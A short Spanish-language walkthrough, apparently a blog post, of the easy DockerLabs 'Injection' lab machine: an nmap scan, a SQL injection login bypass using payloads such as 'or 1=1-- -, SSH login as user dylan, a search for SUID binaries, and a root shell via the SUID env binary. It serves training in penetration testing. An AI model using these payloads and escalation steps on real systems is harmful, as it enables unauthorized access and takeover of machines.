---
layout: post
title: "Injection"
date: 2024-07-01 11:05:23
category: dockerlabs
vm: dockerlabs
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Injection </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Muy Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

![img](/notas/public/img/dockerlabs/injection/host.png){:.margin}

**1\.** Escaneando puertos y servicios de la maquina.

`sudo nmap -p- -T5 -sCV --min-rate=5000 -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/injection/nmap.png){:.margin}

**2\.** Por el servicio apache encontramos un panel login.

`http://172.17.0.2`

![img](/notas/public/img/dockerlabs/injection/80.png){:.margin}

**3\.** Intento provocar un error en la query, ya sabiendo que se acontece una injection sql, bypasseo el login.

`' or 1=1`

`'or 1=1-- -`

![img](/notas/public/img/dockerlabs/injection/errordb.png){:.margin}
![img](/notas/public/img/dockerlabs/injection/loginor.png){:.margin}
![img](/notas/public/img/dockerlabs/injection/loginok.png){:.margin}

**4\.** Me conecto por ssh como dylan.

`ssh dylan@172.17.0.2`

![img](/notas/public/img/dockerlabs/injection/sshdylan.png){:.margin}

**5\.** Busco binarios SUID.

`find / -perm -4000 2>/dev/null`

![img](/notas/public/img/dockerlabs/injection/find.png){:.margin}

**6\.** Escalando privilegios, podemos aprovechar el binario env si lo buscamos en [gtfobins](https://gtfobins.github.io/gtfobins/env/#suid).

`/usr/bin/env /bin/bash -p`

![img](/notas/public/img/dockerlabs/injection/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>